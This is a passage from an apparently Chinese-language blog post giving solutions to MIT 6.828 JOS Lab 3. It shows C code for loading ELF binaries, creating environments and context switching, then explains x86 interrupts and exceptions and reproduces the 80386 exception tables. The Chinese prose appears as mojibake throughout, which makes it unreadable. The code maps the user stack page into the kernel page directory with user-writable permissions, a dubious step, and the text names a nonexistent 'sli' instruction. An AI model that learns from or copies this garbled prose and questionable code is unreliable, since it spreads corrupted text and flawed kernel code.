at</span><br><span class="hljs-comment">//  &#x27;binary + ph-&gt;p_offset&#x27;, should be copied to virtual address</span><br><span class="hljs-comment">//  ph-&gt;p_va.  Any remaining memory bytes should be cleared to zero.</span><br><span class="hljs-comment">//  (The ELF header should have ph-&gt;p_filesz &lt;= ph-&gt;p_memsz.)</span><br><span class="hljs-comment">//  Use functions from the previous lab to allocate and map pages.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  All page protection bits should be user read/write for now.</span><br><span class="hljs-comment">//  ELF segments are not necessarily page-aligned, but you can</span><br><span class="hljs-comment">//  assume for this function that no two segments will touch</span><br><span class="hljs-comment">//  the same virtual page.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  You may find a function like region_alloc useful.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  Loading the segments is much simpler if you can move data</span><br><span class="hljs-comment">//  directly into the virtual addresses stored in the ELF binary.</span><br><span class="hljs-comment">//  So which page directory should be in force during</span><br><span class="hljs-comment">//  this function?</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  You must also do something with the program&#x27;s entry point,</span><br><span class="hljs-comment">//  to make sure that the environment starts executing there.</span><br><span class="hljs-comment">//  What?  (See env_run() and env_pop_tf() below.)</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Elf</span> *<span class="hljs-title">elfhdr</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Proghdr</span> *<span class="hljs-title">ph</span>, *<span class="hljs-title">eph</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">ustack</span>;</span><br><br><span class="hljs-comment">// check ELF magic</span><br>elfhdr = (<span class="hljs-keyword">struct</span> Elf*) binary;<br><span class="hljs-keyword">if</span> (elfhdr-&gt;e_magic != ELF_MAGIC)<br>panic(<span class="hljs-string">&quot;Invalid ELF header!&quot;</span>);<br><br><span class="hljs-comment">// switch to user pgdir</span><br>lcr3(PADDR(e-&gt;env_pgdir));<br><br><span class="hljs-comment">// analyze the header table and copy data</span><br>ph = (<span class="hljs-keyword">struct</span> Proghdr *) (binary + elfhdr-&gt;e_phoff);<br>eph = ph + elfhdr-&gt;e_phnum;<br><span class="hljs-keyword">for</span> (; ph &lt; eph; ph++)<br>&#123;<br><span class="hljs-keyword">if</span> (ph-&gt;p_type != ELF_PROG_LOAD)<br><span class="hljs-keyword">continue</span>;<br><br>region_alloc(e, (<span class="hljs-type">void</span>*)ph-&gt;p_va, ph-&gt;p_memsz);<br><span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span>*)(ph-&gt;p_va), <span class="hljs-number">0</span>, ph-&gt;p_memsz);<br><span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)(ph-&gt;p_va), (<span class="hljs-type">void</span>*)(binary + ph-&gt;p_offset), ph-&gt;p_filesz);<br>&#125;<br><br><span class="hljs-comment">// set the entry point</span><br>e-&gt;env_tf.tf_eip = elfhdr-&gt;e_entry;<br><br><span class="hljs-comment">// Now map one page for the program&#x27;s initial stack</span><br><span class="hljs-comment">// at virtual address USTACKTOP - PGSIZE.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>region_alloc(e, (<span class="hljs-type">void</span>*)(USTACKTOP - PGSIZE), PGSIZE);<br>ustack = page_lookup(e-&gt;env_pgdir, (<span class="hljs-type">void</span>*)(USTACKTOP - PGSIZE), <span class="hljs-literal">NULL</span>);<br>page_insert(kern_pgdir, ustack, (<span class="hljs-type">void</span>*)(USTACKTOP - PGSIZE), PTE_U | PTE_W);<br><br><span class="hljs-comment">// recover kernel pgdir</span><br>lcr3(PADDR(kern_pgdir));<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="env-create-ï¼šåˆ›å»ºè¿›ç¨‹ç¯å¢ƒ">env_create()ï¼šåˆ›å»ºè¿›ç¨‹ç¯å¢ƒ</h4><p>è°ƒç”¨ <code>env_alloc()</code> åˆ†é… PCBã€è°ƒç”¨ <code>load_icode()</code> è§£æè½½å…¥ ELF å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Allocates a new env with env_alloc, loads the named elf</span><br><span class="hljs-comment">// binary into it with load_icode, and sets its env_type.</span><br><span class="hljs-comment">// This function is ONLY called during kernel initialization,</span><br><span class="hljs-comment">// before running the first user-mode environment.</span><br><span class="hljs-comment">// The new env&#x27;s parent ID is set to 0.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">env_create</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> *binary, <span class="hljs-keyword">enum</span> EnvType type)</span><br>&#123;<br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">new_env</span>;</span><br><span class="hljs-keyword">switch</span>(env_alloc(&amp;new_env, <span class="hljs-number">0</span>))<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<span class="hljs-comment">// success</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> -E_NO_FREE_ENV:<br>panic(<span class="hljs-string">&quot;No free Env now!&quot;</span>);<br><span class="hljs-keyword">case</span> -E_NO_MEM:<br>panic(<span class="hljs-string">&quot;OOM while alloc the Env!&quot;</span>);<br><span class="hljs-keyword">default</span>:<br>panic(<span class="hljs-string">&quot;unknown fault from env_alloc!&quot;</span>);<br>&#125;<br><br>new_env-&gt;env_type = type;<br>load_icode(new_env, binary);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="env-run-ï¼šå°†è¿›ç¨‹åŠ å…¥è¿è¡Œé˜Ÿåˆ—">env_run()ï¼šå°†è¿›ç¨‹åŠ å…¥è¿è¡Œé˜Ÿåˆ—</h4><p>åˆ†ä¸ºä¸‰æ­¥èµ°ï¼š</p><ul><li>è‹¥å½“å‰æœ‰è¿›ç¨‹åœ¨è¿è¡Œï¼ˆcurenv != NULL)ï¼Œå°†å…¶çŠ¶æ€è®¾ä¸º <code>ENV_RUNNABLE</code></li><li>å°† curenv è®¾ä¸ºå¾…è¿è¡Œè¿›ç¨‹çš„ Envå¹¶æ”¹å˜å…¶çŠ¶æ€ã€å¢åŠ è¿è¡Œæ¬¡æ•°è®¡æ•°ï¼Œåˆ‡æ¢åˆ°ç”¨æˆ·é¡µè¡¨</li><li>æ¢å¤ç”¨æˆ·è¿›ç¨‹è¿è¡Œä¸Šä¸‹æ–‡ï¼Œä»å†…æ ¸æ€åˆ‡æ¢åˆ°ç”¨æˆ·æ€</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Context switch from curenv to env e.</span><br><span class="hljs-comment">// Note: if this is the first call to env_run, curenv is NULL.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function does not return.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">env_run</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br><span class="hljs-comment">// Step 1: If this is a context switch (a new environment is running):</span><br><span class="hljs-comment">//   1. Set the current environment (if any) back to</span><br><span class="hljs-comment">//      ENV_RUNNABLE if it is ENV_RUNNING (think about</span><br><span class="hljs-comment">//      what other states it can be in),</span><br><span class="hljs-comment">//   2. Set &#x27;curenv&#x27; to the new environment,</span><br><span class="hljs-comment">//   3. Set its status to ENV_RUNNING,</span><br><span class="hljs-comment">//   4. Update its &#x27;env_runs&#x27; counter,</span><br><span class="hljs-comment">//   5. Use lcr3() to switch to its address space.</span><br><span class="hljs-comment">// Step 2: Use env_pop_tf() to restore the environment&#x27;s</span><br><span class="hljs-comment">//   registers and drop into user mode in the</span><br><span class="hljs-comment">//   environment.</span><br><br><span class="hljs-comment">// Hint: This function loads the new environment&#x27;s state from</span><br><span class="hljs-comment">//e-&gt;env_tf.  Go back through the code you wrote above</span><br><span class="hljs-comment">//and make sure you have set the relevant parts of</span><br><span class="hljs-comment">//e-&gt;env_tf to sensible values.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">if</span> (curenv)<br>&#123;<br><span class="hljs-keyword">switch</span> (curenv-&gt;env_status)<br>&#123;<br><span class="hljs-keyword">case</span> ENV_RUNNING:<br><span class="hljs-keyword">case</span> ENV_RUNNABLE:<br><span class="hljs-keyword">case</span> ENV_NOT_RUNNABLE:<br>curenv-&gt;env_status = ENV_RUNNABLE;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> ENV_FREE:<br>panic(<span class="hljs-string">&quot;running a free Env!&quot;</span>);<br><span class="hljs-keyword">case</span> ENV_DYING:<br>panic(<span class="hljs-string">&quot;running a dying Env!&quot;</span>);<br><span class="hljs-keyword">default</span>:<br>panic(<span class="hljs-string">&quot;The env is crashed!&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// set the curenv</span><br>curenv = e;<br>curenv-&gt;env_status = ENV_RUNNING;<br>curenv-&gt;env_runs++;<br><br><span class="hljs-comment">// recover the context of process and ret2usr</span><br>lcr3(PADDR(curenv-&gt;env_pgdir));<br>env_pop_tf(&amp;curenv-&gt;env_tf);<br><br><span class="hljs-comment">// we never arrive there</span><br>panic(<span class="hljs-string">&quot;env_run not yet implemented&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å®Œæˆè¿™ä¸€åˆ‡åï¼Œæˆ‘ä»¬æ¥è·‘ä¸€ä¸‹è¿™ä»½ä»£ç ï¼Œ<strong>ä½ ä¼šå‘ç°å†…æ ¸æˆåŠŸåœ°è¿è¡Œäº†ç¨‹åº helloï¼Œå¹¶åœ¨å…¶å°è¯•è°ƒç”¨ 0x30å·ä¸­æ–­æ—¶ è§¦å‘äº† triple fault å¯¼è‡´è¿è¡Œæš‚åœ</strong></p><p><img src="https://s2.loli.net/2022/03/17/5E9QxkMsrFnKoOq.png" alt="image.png"></p><p>é‚£ä¸ºä»€ä¹ˆä¼šè§¦å‘ triple fault å‘¢ï¼Ÿå¦‚åŒ 32ä½ Linux kernel æ‰€åšçš„ä¸€èˆ¬ï¼ŒJOS ä¹Ÿå°†ç³»ç»Ÿè°ƒç”¨å®ç°ä¸ºä¸€ä¸ªä¸­æ–­ï¼Œè¿™ä¾¿æ˜¯ç¬¬ä¸€ä¸ª faultï¼ˆéœ€è¦æ³¨æ„ fault å¹¶ééƒ½ä»£è¡¨é”™è¯¯ï¼Œå¾ˆå¤šæœºåˆ¶å…¶å®æ˜¯é€šè¿‡è¿™ç§â€œfaultâ€çš„è§¦å‘è€Œå®ç°çš„ï¼‰ï¼›è€Œç”±äº JOS å°šæœªè®¾ç½®ä¸­æ–­å¤„ç†ç¨‹åºï¼Œå› æ­¤ CPU ä¼šç”Ÿæˆä¸€ä¸ª general protection exceptionï¼Œè¿™ä¾¿æ˜¯ double faultï¼›ç„¶å CPU åˆè¦å¤„ç†ç”Ÿæˆçš„è¿™ä¸ª exceptionï¼Œä½†æ˜¯æ²¡æœ‰å¯¹åº”çš„å¤„ç†ç¨‹åºï¼ˆå¥—å¨ƒäº†ï¼‰ï¼Œäºæ˜¯å°± triple fault äº†ï¼Œä½†æ˜¯è¿™å¹¶ä¸ä¼šæ— é™åµŒå¥—ä¸‹å»ï¼Œåœ¨ triple fault çš„æ—¶å€™ç³»ç»Ÿå°±å®Œå…¨æ— æ³•è¿è¡Œäº†ï¼Œé€šå¸¸æƒ…å†µä¸‹å°±é‡å¯äº†ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ patched qemu æ‰€ä»¥ä¼šè¢« qemu æŒ‚èµ·</p><h3 id="Handling-Interrupts-and-Exceptions">Handling Interrupts and Exceptions</h3><p>å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å®ç°ä¸­æ–­å¤„ç†ä¸å¼‚å¸¸å¤„ç†ï¼Œé¦–å…ˆæ˜¯ Exercise 3ï¼Œé˜…è¯»äº†è§£ä¸­æ–­ä¸å¼‚å¸¸ç›¸å…³åŸºç¡€çŸ¥è¯†</p><blockquote><p><strong>Exercise 3.</strong> Read <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/c09.htm">Chapter 9, Exceptions and Interrupts</a> in the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">80386 Programmerâ€™s Manual</a> (or Chapter 5 of the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/IA32-3A.pdf">IA-32 Developerâ€™s Manual</a>), if you havenâ€™t already.</p></blockquote><p><strong>ä¸­æ–­</strong>ï¼ˆinterruptï¼‰ä¸<strong>å¼‚å¸¸</strong>ï¼ˆexceptionï¼‰æ˜¯ä¸¤ç§ç‰¹åˆ«çš„æ”¹å˜æ§åˆ¶æµçš„æ–¹å¼ï¼Œå…¶å·¥ä½œåŸç†ç±»ä¼¼äºéç¼–ç¨‹å¼çš„ <code>call</code> æŒ‡ä»¤â€”â€”æ”¹å˜æ­£å¸¸çš„ç¨‹åºæµç¨‹ä»¥å¤„ç†å¤–éƒ¨äº‹ä»¶æˆ–æŠ¥å‘Šé”™è¯¯ä¸å¼‚å¸¸æƒ…å†µ</p><p>ä¸­æ–­ä¸å¼‚å¸¸çš„åŒºåˆ«åœ¨äºä¸­æ–­ç”¨ä»¥å¤„ç†å¤„ç†å™¨å¤–çš„å¼‚æ­¥äº‹ä»¶ï¼Œè€Œå¼‚å¸¸åˆ™æ˜¯å¤„ç†å™¨åœ¨è¿è¡Œæ—¶æ£€æµ‹åˆ°å¼‚å¸¸äº‹ä»¶åçš„å¤„ç†</p><p>ä¸­æ–­ä¸å¼‚å¸¸é€šå¸¸æœ‰å¦‚ä¸‹æ¥æºï¼š</p><ul><li>ä¸­æ–­ï¼š<ul><li>å¯å±è”½ä¸­æ–­ï¼Œé€šè¿‡ INTR å¼•è„šå‘å‡º</li><li>ä¸å¯å±è”½ä¸­æ–­ï¼Œé€šè¿‡ NMI å¼•è„šå‘å‡º</li></ul></li><li>å¼‚å¸¸ï¼š<ul><li>ç”±å¤„ç†å™¨æ£€æµ‹åˆ°çš„ï¼Œå…·ä½“å¯åˆ†ä¸º faultsã€traps ä¸ aborts</li><li>ç¼–ç¨‹å¼çš„ï¼Œé€šè¿‡æŒ‡ä»¤ intoã€int 3ã€int nã€bound å¯è§¦å‘å¼‚å¸¸ï¼Œé€šå¸¸ç§°ä¹‹ä¸ºâ€œè½¯ä¸­æ–­â€ï¼Œä½†å¤„ç†å™¨å°†å…¶ä½œä¸ºå¼‚å¸¸æ¥å¤„ç†</li></ul></li></ul><h4 id="Identify-Interrupts">Identify Interrupts</h4><p>å¤„ç†å™¨å°†ä¸åŒçš„ä¸­æ–­ä¸å¼‚å¸¸è¿›è¡Œç‹¬ç«‹æ ‡å·ï¼Œå…¶ä¸­ NMI ä¸å¼‚å¸¸å¯¹åº”æ ‡å· 0 ~ 31ï¼ˆå¹¶éæ‰€æœ‰æ ‡å·éƒ½æœ‰å¯¹åº”ç”¨é€”ï¼Œéƒ¨åˆ†æ ‡å·ä¸ºæœªæ¥ä¿ç•™ï¼‰ï¼›å¯å±è”½ä¸­æ–­çš„æ ‡è¯†ç¬¦ç”±å¤–éƒ¨ä¸­æ–­æ§åˆ¶å™¨ï¼ˆä¾‹å¦‚ Intel 8259A çš„å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨ï¼ˆProgrammable Interrupt Controllerï¼‰ï¼‰ç¡®å®šï¼Œå¹¶åœ¨å¤„ç†å™¨çš„ä¸­æ–­ç¡®è®¤åºåˆ—ä¸­ä¸å¤„ç†å™¨é€šä¿¡ï¼Œ8259A çš„ PIC åˆ†é…çš„æ ‡å·å¯ä»¥ç”±è½¯ä»¶æŒ‡å®šï¼ŒèŒƒå›´ä¸º 32 ~ 255</p><p>æ ¹æ®å¼‚å¸¸æŠ¥å‘Šçš„æ–¹å¼ä¸æ˜¯å¦æ”¯æŒé‡å¯æŒ‡ä»¤å°†å…¶åˆ†ä¸ºä¸‰ç±»ï¼š</p><ul><li><p>Faultsï¼šåœ¨â€œæŒ‡ä»¤é€ æˆå¼‚å¸¸å‰â€è¢«æŠ¥å‘Šçš„å¼‚å¸¸ï¼Œå¯ä»¥æ˜¯åœ¨æŒ‡ä»¤å¼€å§‹æ‰§è¡Œæ—¶æˆ–æ˜¯æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«æ£€æµ‹åˆ°ï¼Œè‹¥åœ¨æ‰§è¡ŒæŒ‡ä»¤æ—¶æ£€æµ‹åˆ°å¼‚å¸¸ï¼Œåˆ™ä¼šä¿å­˜å½“å‰ä¸Šä¸‹æ–‡ï¼Œå®Œæˆå¼‚å¸¸å¤„ç†åå†æ¢å¤ä¸Šä¸‹æ–‡ï¼Œ<strong>é‡æ–°ä»é€ æˆå¼‚å¸¸çš„æŒ‡ä»¤å¼€å§‹æ‰§è¡Œ</strong></p><blockquote><p>ä¸¾ä¸ªğŸŒ°ï¼šLinux ä¸­çš„ page fault å°±æ˜¯è¿™æ ·çš„ä¸€ç§å¼‚å¸¸ï¼Œå½“è¯»å†™å°šæœªåˆ†é…å†…å­˜é¡µçš„åœ°å€æ—¶ï¼ˆæ¯”å¦‚è¯´ mmap åˆ†é…äº†ä¸€ä¸ª vma ä½†æ˜¯è¿˜æ²¡åˆ†é…ç‰©ç†é¡µæ¡†ï¼‰ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸å¤„ç†ç¨‹åºï¼Œåˆ†é…å†…å­˜é¡µåå†é‡æ–°ä»è¯»å†™çš„æŒ‡ä»¤å¼€å§‹è¿è¡Œ</p></blockquote></li><li><p>Trapsï¼šåœ¨æ£€æµ‹åˆ°å¼‚å¸¸çš„æŒ‡ä»¤åç«‹å³åœ¨æŒ‡ä»¤è¾¹ç•ŒæŠ¥å‘Šçš„å¼‚å¸¸ï¼ˆ<s>åˆ«é—®ï¼ŒğŸ‘´ä¹Ÿæ²¡çœ‹æ‡‚è‹±æ–‡åŸæ–‡å•¥æ„æ€</s>ï¼‰</p><blockquote><p>ä¸¾ä¸ªğŸŒ°ï¼šç³»ç»Ÿè°ƒç”¨çš„æµç¨‹ç®€åŒ–åç±»ä¼¼äºä¸€ä¸ªé™·é˜±ï¼Œç”¨æˆ·æ€è¿›ç¨‹å¸ƒç½®å¥½æ•°æ®åé€šè¿‡æŒ‡ä»¤é™·å…¥åˆ°å†…æ ¸æ€ï¼Œå†…æ ¸å®Œæˆå¤„ç†åå†è¿”å›ç”¨æˆ·æ€ï¼Œæ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤</p></blockquote></li><li><p>Abortsï¼šæ˜¯ä¸€ç§æ—¢ä¸ç²¾ç¡®å®šä½æŒ‡ä»¤ä¹Ÿä¸é‡å¯ç¨‹åºçš„å¼‚å¸¸ï¼Œé€šå¸¸ç”¨æ¥æŠ¥å‘Š<strong>ä¸¥é‡çš„é”™è¯¯</strong>ï¼ˆä¾‹å¦‚ç¡¬ä»¶é”™è¯¯æˆ–éæ³•å€¼ï¼‰</p><blockquote><p>ä¾‹å¦‚é™¤ä»¥ 0 å¯èƒ½å°±æ˜¯ä¸€ç§ Abortï¼Ÿ</p></blockquote></li></ul><p>ä¸‹è¡¨æ˜¾ç¤ºäº†ä¸­æ–­ä¸å¼‚å¸¸å¯¹åº”ç±»å‹çš„æ ‡è¯†ç¬¦</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs smali">Table 9-1. Interrupt<span class="hljs-built_in"> and </span>Exception ID Assignments<br><br>Identifier   Description<br><br>0            Divide error<br>1            Debug exceptions<br>2            Nonmaskable interrupt<br>3            Breakpoint (one-byte INT 3 instruction)<br>4            Overflow (INTO instruction)<br>5            Bounds<span class="hljs-built_in"> check </span>(BOUND instruction)<br>6            Invalid opcode<br>7            Coprocessor<span class="hljs-built_in"> not </span>available<br>8            Double fault<br>9            (reserved)<br>10           Invalid TSS<br>11           Segment<span class="hljs-built_in"> not </span>present<br>12           Stack exception<br>13           General protection<br>14           Page fault<br>15           (reserved)<br>16           Coprecessor error<br>17-31        (reserved)<br>32-255       Available for external interrupts via INTR pin<br></code></pre></td></tr></table></figure><h4 id="Enabling-and-Disabling-Interrupts">Enabling and Disabling Interrupts</h4><p>è‹¥å¤šä¸ªä¸­æ–­åŒæ—¶å‘ç”Ÿï¼Œæˆ‘ä»¬ä¸åº”å½“åœ¨å¤„ç†ä¸€ä¸ªä¸­æ–­æ—¶è·‘å»å¤„ç†å¦ä¸€ä¸ªä¸­æ–­ï¼Œå› æ­¤éœ€è¦æ˜ç¡®ä»€ä¹ˆæ—¶å€™èƒ½è¿›è¡Œä¸­æ–­å¤„ç†</p><p>å¯¹äºä¸å¯å±è”½ä¸­æ–­è€Œè¨€ï¼Œå¤„ç†å™¨åœ¨æ‰§è¡Œåˆ° iret æŒ‡ä»¤ä¹‹å‰éƒ½ä¼šå¿½ç•¥ NMI å¼•è„šä¸Šçš„ä¸­æ–­ä¿¡å·</p><p>å¯¹äºå¯å±è”½ä¸­æ–­è€Œè¨€ï¼Œå½“ IF æ ‡å¿—ä½ä¸º 0 æ—¶ä¸­æ–­è¢«å…³é—­ï¼Œåªæœ‰åœ¨ IF == 1æ—¶æ‰èƒ½è¿›è¡Œï¼Œä¸å…¶ä»–æ ‡å¿—ä½ä¸€æ ·ï¼Œåœ¨å¤„ç†å™¨é‡ç½®æ—¶ IF ä¼šè¢«æ¸…ç©ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>cli</code> ä¸ <code>sli</code> æŒ‡ä»¤æ¸…ç©ºæˆ–è®¾ç½® IF æ ‡å¿—ä½ï¼Œè¿™ä¸¤ä¸ªæŒ‡ä»¤åªæœ‰åœ¨ CLI ï¼ˆç‰¹æƒçº§ï¼‰&lt;= IOPL æ—¶æ‰å¯ç”¨ï¼Œå¦åˆ™ä¼šè§¦å‘ä¿æŠ¤å¼‚å¸¸</p><p>IF æ ‡å¿—ä½è¿˜ä¼šè¢«è¿™äº›æ“ä½œå½±å“ï¼š</p><ul><li><code>pushf</code> æŒ‡ä»¤å°† eflags å¯„å­˜å™¨çš„å€¼æ¨åˆ°æ ˆä¸Š</li><li>åœ¨ä»»åŠ¡åˆ‡æ¢æ—¶ä¼šè°ƒç”¨ <code>popf</code> ä¸ <code>iret</code> æŒ‡ä»¤è½½å…¥æ ‡å¿—ä½å¯„å­˜å™¨</li><li>åœ¨é€šè¿‡ä¸­æ–­é—¨æ—¶ä¼šè‡ªåŠ¨é‡ç½® IF æ ‡å¿—ä½ï¼Œå…³é—­ä¸­æ–­</li></ul><p>RF æ ‡å¿—ä½ç”¨ä»¥æ§åˆ¶ debug faultï¼Œå¯¹äºç»™å®šæŒ‡ä»¤å…¶æœ€å¤šä¼šè¢«è§¦å‘ä¸€æ¬¡</p><p>å¯¹ ss å¯„å­˜å™¨çš„æ›´æ”¹ï¼ˆmov æˆ– popï¼‰ä¹Ÿä¼šå½±å“ä¸€äº›ä¸­æ–­ä¸å¼‚å¸¸ï¼Œä¾‹å¦‚æˆ‘ä»¬æ”¹å˜å †æ ˆï¼ˆ<code>ss:esp</code>ï¼‰çš„è¿‡ç¨‹ä¸­ï¼ˆåˆšå¥½æ”¹äº† ss æ²¡æ”¹ espï¼‰å¤„ç†äº†ä¸­æ–­æˆ–å¼‚å¸¸ï¼Œåˆ™å †æ ˆæŒ‡é’ˆåœ¨ä¸­æ–­/å¼‚å¸¸å¤„ç†çš„è¿‡ç¨‹ä¸­æ˜¯ä¸ä¸€è‡´çš„ï¼Œå› æ­¤ 80386 åœ¨æ›´æ”¹ ss çš„æŒ‡ä»¤åçš„æŒ‡ä»¤è¾¹ç•Œå¤„ç¦æ­¢ NMIã€INTRã€debug fault æˆ–å•æ­¥é™·é˜±ï¼Œå¯èƒ½ä¼šæœ‰ä¾‹å¤–ï¼špage fault æˆ– general protection faultï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨ 80386 çš„ <code>lss</code> æŒ‡ä»¤</p><h4 id="Priority-Among-Simultaneous-Interrupts-and-Exceptions">Priority Among Simultaneous Interrupts and Exceptions</h4><p>ä¸­æ–­ä¸å¼‚å¸¸çš„å¤„ç†åŒæ ·æœ‰ç€ä¼˜å…ˆçº§ï¼Œå¤„ç†å™¨ä¼šå…ˆå¤„ç†é«˜ä¼˜å…ˆçº§çš„å¼‚å¸¸è€Œä¸¢å¼ƒä½ä¼˜å…ˆçº§çš„å¼‚å¸¸ï¼Œå½“ä¸­æ–­å¤„ç†è¿”å›æ—¶ä¼šå‘ç°è¢«ä¸¢å¼ƒçš„å¼‚å¸¸å¹¶é‡æ–°å¤„ç†ï¼›ä¼˜å…ˆçº§é¡ºåºå¦‚ä¸‹ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Table</span> <span class="hljs-number">9</span><span class="hljs-number">-2.</span> Priority Among Simultaneous Interrupts <span class="hljs-keyword">and</span> Exceptions<br><br>Priority   <span class="hljs-keyword">Class</span> <span class="hljs-keyword">of</span> Interrupt <span class="hljs-keyword">or</span> <span class="hljs-keyword">Exception</span><br><br>HIGHEST    Faults <span class="hljs-keyword">except</span> <span class="hljs-keyword">debug</span> faults<br>Trap instructions <span class="hljs-keyword">INTO</span>, <span class="hljs-type">INT</span> n, <span class="hljs-type">INT</span> <span class="hljs-number">3</span><br><span class="hljs-keyword">Debug</span> traps <span class="hljs-keyword">for</span> this instruction<br><span class="hljs-keyword">Debug</span> faults <span class="hljs-keyword">for</span> next instruction<br>NMI interrupt<br>LOWEST     INTR interrupt<br></code></pre></td></tr></table></figure><h4 id="Interrupt-Descriptor-Table">Interrupt Descriptor Table</h4><p>ç±»ä¼¼äºæ®µæè¿°ç¬¦è¡¨ï¼Œä¸­æ–­åŒæ ·æœ‰ç€å¯¹åº”çš„<strong>é—¨æè¿°ç¬¦</strong>ï¼ˆGate Descriptorï¼‰ç»“æ„ä¸ä¸€å¼ <strong>ä¸­æ–­æè¿°ç¬¦è¡¨</strong>ï¼ˆInterrupt Descriptor Tableï¼‰ï¼Œä¸åŒäº GDT ä¸ LDTï¼ŒIDT çš„ç¬¬ä¸€ä¸ªæè¿°ç¬¦æ˜¯å¯ç”¨çš„ï¼Œå› ä¸ºä¸­æ–­ä¸å¼‚å¸¸ä¸€å…±æœ‰ç€ 256 ä¸ªæ ‡å·ï¼Œå› æ­¤ä¸€å¼ ä¸­æ–­æè¿°ç¬¦è¡¨ä¸Šæœ€å¤šå¯ä»¥æœ‰ 256 